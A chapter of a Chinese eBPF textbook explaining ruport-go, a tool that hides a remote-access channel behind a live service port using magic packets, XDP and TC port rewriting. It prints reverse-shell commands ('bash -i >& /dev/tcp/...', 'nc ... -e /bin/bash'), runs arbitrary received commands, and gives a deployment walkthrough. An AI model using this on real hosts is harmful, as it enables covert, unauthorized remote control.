# 第 17 章 逐模块精读与端到端联调

> 打开仓库源码对答案。本章按"契约 → 三个执行层 → 控制与发送端"
> 的顺序逐模块精读（文件路径均相对仓库根），每个模块先给结构图
> 再讲关键行；随后是与 C 原版的对照、端到端联调手册与扩展练习。
> 建议边读边开着编辑器跳转——本章就是仓库的"导览地图"。

## 17.1 契约层：bpf/common.h

```c
#pragma pack(1)                          // 第4章铁律：跨边界必 pack
struct Message { /* 124 字节，字段表见 16.3.1 */ };
struct Router  { /* 10 字节，  见 16.3.2 */ };
#define LEN_DEFAULT_BUF 100
#define MAX_MAP_ENTRIES 1024             // 两张表的容量承诺
```

两份契约的**唯一真源**（single source of truth）：Go 侧的类型由
bpf2go `-type Message/Router` 从这里的 BTF 生成（14.3.3），布局
永远与内核一致——第 4 章的"2 字节惨案"从机制上被排除。

## 17.2 嗅探层：bpf/ruport_xdp.bpf.c

结构一览（本模块就是第 7 章地图位置② 的实现）：

```
 xdp_parse(ctx)
   └─ parse_package(data, data_end)
        ├─ eth → IPv4 → TCP 三层证明（第3章模式一/变长头）
        ├─ 长度证明：剩余 ≥ 12 + sizeof(Message)（第3章模式二）
        ├─ is_ins_package()：魔术校验 s1²+s2²=s3
        └─ 认包成功 → 逐字段搬进 struct Message → message_map
```

**边界检查三段式**（逐行对应第 3 章 3.5 的模式）：以太头 →
`iph + 1` → `tcph = iph + ihl*4`（变长 IP 选项安全）→
`pdata = tcph + doff*4`（变长 TCP 选项安全）→ 一次性证明
`12 + sizeof(struct Message)`。

**魔术校验的一个数学细节**：

```c
__be64 ss1 = (__be32)s1 * (__be32)s1;   // 65535² = 4,294,836,225
                                          // < 2³²-1 = 4,294,967,295 ✓
```

s1、s2 先提升到 32 位再平方——乘法留在 32 位域不溢出，赋给 64 位
后相加。若直接用 16 位乘，高位截断校验式就废了。

**收件语义**：查一下 message_map，**没有这个 key 才插入**（同源
去重，防止控制端重发导致同 key 覆盖前一条未取走的指令）；
最后 `return XDP_PASS`——第 16 章约束 C1 的落点。

## 17.3 改写层：bpf/ruport_tc.bpf.c

两个函数对称，先看共用的"查表命中"骨架（以 ingress 为例）：

```c
__be64 key = ((__be64)sourceIp << 16) + sourcePort;   // ← 16.3.2 契约
struct Router *value = bpf_map_lookup_elem(&router_map, &key);
if (value != 0) {
    if (sourceIp == value->cip &&          // 三重确认：确实是
        sourcePort == value->cport &&      // 那条注册过的控制流
        value->nativeport != 0) {
        // ... 手术 + 学习（下文）
    }
}
```

**ingress（入向）**：命中且 nativeport 已知 → 目的端口改写 +
校验和修复（与第 8 章手术三步逐行相同，只是"改写成什么"来自
`value->nativeport` 而非常量）；若 `connport == 0`，把包**真实的**
目的端口（即对外端口）回填学习。

**egress（出向）**：镜像逻辑——key 用目的地址（=控制端），命中且
connport 已知 → 源端口改写为 `connport`；若 `nativeport == 0`
回填学习真实源端口。

**学习为什么是"memcpy 出来改完整条 Update 回去"而不是原地改
`value->connport = destPort`**——第 13 章 13.2.4 的锁区间给了
源码级答案：bucket 锁只在内核的 update 路径内持有，BPF 程序里的
`value` 指针处于锁外，与其他核的并发写会互相踩；整条替换走
内核 update 路径，享受头插+RCU 的单条原子性。

**一处有意的简化**：`l4_off = ETH_HLEN + 20`——IP 头按固定 20
字节算，不处理带 IP 选项的包（内核自身极少发这种包）。要兼容
时按 `ihl*4` 动态算并补 IP 头校验和即可（第 8 章练习 4 的答案）。

## 17.4 控制面：cmd/ruport/main.go

启动序列（顺序即依赖，全程对应第 2 章"加载四职责"+第 14 章
责任矩阵）：

```
 rlimit.RemoveMemlock           ① <5.11 兜底
 bpf.LoadXdpObjects(&xdpObjs)   ② 生成器加载（14.3）
 link.AttachXDP(GenericMode)    ③ 嗅探层就位
 bpf.LoadTcObjects(&tcObjs)     ④
 attachTcFilters(...)           ⑤ netlink 建 clsact + 双向 filter
                                 （第8章同款：EEXIST 复用/prio 1/handle 0:1）
 go waitWeakupWorker(...)       ⑥ 每秒轮询 message_map
 signal.Notify(SIGINT/SIGSEGV)  ⑦ 等信号
 退出：tcAt.release() → xdpLink.Close() → objs.Close()
      （先删引用方再关被引用方——14.4 清理顺序纪律）
```

**网卡自动选择**（未传 `-i` 时）：解析 `/proc/net/dev`，跳过 lo，
选 **tx 字节数最大**的网卡——"最忙的外联口"启发式。两处工程
细节：跳过表头两行；`tx_bytes` 是第 9 列（第 rx 的 8 列 +1）。

**轮询循环**（第 5 章 5.3.2 模式的落地）：

```go
keys := 收集全部 key（Iterate）        // 快照 key，规避游标不确定性
for _, k := range keys {
    LookupAndDelete(k, &msg)           // 取出即删（4.4 消息模式）
    ctl.HandleRouter(&msg, routerMap)  // 先路由（可能删）
    ctl.HandleProcess(&msg)            // 后动作（可能反弹）
}
```

## 17.5 指令处理：internal/control/control.go

**HandleRouter**——契约 16.3.1 的直接翻译：

```go
hi, lo := uint8(msg.Ins>>8), uint8(msg.Ins)   // 高=删除标志 低=功能码
key := uint64(msg.Cip)<<16 | uint64(msg.Cport) // 原始值拼装，零转换

hi > 0  → routerMap.LookupAndDelete(key)      // 删除路由
hi == 0 → 已存在则跳过；否则按 lo 分派：
          0x01: nativeport==0 → 报错跳过（加路由必须给内部端口）
                否则与 0x02/0x03 一样整条写入 router_map
```

（`0x01` 分支还原了 C 版 switch 的 fallthrough 语义：Go 不自动
落穿，用提前 return 表达同一行为。）

**HandleProcess**——按 lo 执行动作，childTable（加锁 map）替代
原 C 版的 FunctionNode 链表：

```
 0x02 + ext=="bash" → exec.Command("/bin/sh","-c",
                        "bash -i >& /dev/tcp/ip/port 0>&1").Start()
 0x02 + ext=="nc"   → 同目录 ./nc ip port -e /bin/bash，记录 pid
 0x02 + hi>0        → 查表 kill(pid, SIGINT)（撤销反弹）
 0x03               → ext 整串作为 shell 命令执行
```

`Start()` = fork+exec 不等待（与 C 版一致：子进程独立存活）。

**字节序助手**——第 4 章三步口诀的实战内联：

```go
ip2str(v): LittleEndian.PutUint32(b, v) → net.IP(b).String()
toHostPort(v): LittleEndian.PutUint16 → BigEndian.Uint16
```

再念一遍推论：**这两个函数只影响"给人看与传给 shell"**；
一切 map key/匹配都用原始值（17.3/17.5 的 key 拼装完全一致）。

## 17.6 发送端：cmd/c3/main.go

124 字节帧的构造器（对照 16.3.1 契约逐偏移实现）：

```
 s1/s2 = 1 + 2*rand(0..32766)          // 随机奇数 1..65533
 s3 = s1²+s2²（LittleEndian 8 字节）
 [12]=lo  [13]=hi(删除时=1)
 [14..18)=inet_aton(ip)（BigEndian 即网络序）
 [18..20)=htons(cport)  [20..22)=htons(connport)  [22..24)=htons(nativeport)
 [24..124)=ext 零填充
 net.DialTimeout 5s → Write → Close
```

命令行与原 c3.py 完全兼容（`-t -p -S -P -x -y -e -i(十六进制)
-d -1..4`）；`-x` 缺省取 `-p`；加路由（01）强制要求 `-y`。

## 17.7 与 C/libbpf 原版对照

| 原 ruport (C/libbpf) | ruport-go | 章节依据 |
|---|---|---|
| `ruport_xdp__open/load` | `bpf.LoadXdpObjects(&objs,nil)` | 14 |
| `bpf_xdp_attach(...,XDP_FLAGS_SKB_MODE,..)` | `link.AttachXDP(GenericMode)` | 7 |
| `bpf_tc_hook_create/attach(prio1,handle1)` | netlink clsact+BpfFilter | 8 |
| `bpf_map_get_next_key` 循环 | `Iterate` 收集 key | 5 |
| `bpf_map_lookup_and_delete_elem` | `LookupAndDelete` | 4 |
| control_router/control_process | `Controller.Handle*` | 本章 |
| `fork+execl("/bin/sh","sh","-c",..)` | `exec.Command(...).Start()` | 本章 |
| `kill(pid,SIGINT)` | `syscall.Kill` | 本章 |
| `bpf_tc_detach+hook_destroy` | `FilterDel×2+QdiscDel` | 8/14 |
| pidhide（原版已注释禁用） | 未移植（保持禁用状态） | — |

## 17.8 端到端联调手册

**环境**：两台 Linux（或单机双 netns），Ubuntu 22.04/24.04、
内核 ≥5.4；被控端 root。仓库 `make` 产出 `ruport` 与 `c3`。

```
 被控端（1.2）                          控制端（1.3）
 ─────────────────────────────────────────────────────────
 # 0) 准备内部服务（nativeport=22 例）
 sudo systemctl start ssh               # 或任意内部端口服务
 # 1) 启动控制面
 sudo ./ruport -i eth0
    预期日志：waitweakup_worker 启动行
    验证：sudo bpftool net show
          （eth0 出现 xdpgeneric 与 clsact）
                                         # 2) 下发"加路由"
                                         ./c3 -t 1.2 -p 80 -1 \
                                              -S 1.3 -P 3333 \
                                              -x 80 -y 22
    预期：被控端日志 "insert a router..."
    验证：sudo bpftool map dump name router_map
                                         # 3) 数据通道验证
                                         ssh -p 80 root@1.2   # ← 80！
    预期：登录成功=ingress/egress 双向改写闭环
    抓包看：被控端 tcpdump -i eth0 tcp port 22
            （能看到改写前的"内部流"）
                                         # 4) 反弹（可选）
                                         ./c3 -t 1.2 -p 80 -2 \
                                              -S 1.3 -P 2222 -x 80 -e bash
    预期：控制端 2222 收到 bash（ncat -lvp 2222 先监听）
                                         # 5) 撤销
                                         ./c3 -t 1.2 -p 80 -d -1 \
                                              -S 1.3 -P 3333 -x 80
    预期：delete a router 日志；ssh 新连接失败
 # 6) Ctrl-C 退出 ruport
    验证：bpftool net show 全部消失（清理干净）
```

**排障入口**（按第 15 章动线）：

- 指令没到 → 动线 B：`bpftool map dump name message_map` 有没有
  内容；`trace_pipe` 看 `:insert a message` 的 bpfprint 输出
  （XDP 认包与否的分界线）；
- 路由加了不改写 → dump router_map 逐字段核对（connport/
  nativeport 是否已学习；key 的四字节十六进制与控制端实际
  源地址是否一致——注意源端口是内核随机分配的，c3 的 `-P` 是
  **控制端监听端口**而非源端口，见 16.3.3 学习机制存在的理由）；
- 改写了但连接不通 → 动线 C/D：tcpdump 双侧对比改写前后端口，
  校验和（握手 SYN 都不过通常是别的层问题）；
- 退出残留 → 动线 B 第 4 步：`tc qdisc del dev eth0 clsact`。

## 17.9 扩展练习

1. **改写规则升级**：把"改端口"升级为"改 IP+端口"（完整 DNAT），
   记得第 8 章练习 4——两处校验和与伪头 flag；
2. **新增指令 0x05**：周期上报路由表快照（控制面 tick 读
   router_map → 控制端 UDP 上报），贯通 c3/-i、HandleRouter 分派、
   Go 侧定时器三处；
3. **事件化改造**：把 message_map 的轮询改为 XDP 侧 ringbuf 通知
   （数据仍走 map 保证取出即删，ringbuf 只做"有新消息"的门铃）——
   权衡推/拉语义（第 6 章结尾之辨）；
4. **多网卡**：当前单网卡设计的改造点清单（提示：attachTcFilters
   与 XDP 挂载参数化、网卡选择的策略化、清理责任扩大）。

---

## 全书结语

从第 1 章那个"谁在吃带宽"的工单，到本章一个完整的端口复用
系统——你已经走完 eBPF 从入门到精通的完整路径：**历史与安全
模型（为什么可行）→ 验证器与 map（怎么安全）→ 网络/观测两大
战场（在哪使用）→ BTF/源码/工程化/调试（如何精通）**。附录是
你的长期工具箱。下一步？回到 17.9 的练习，把 ruport 改成你
自己的系统。
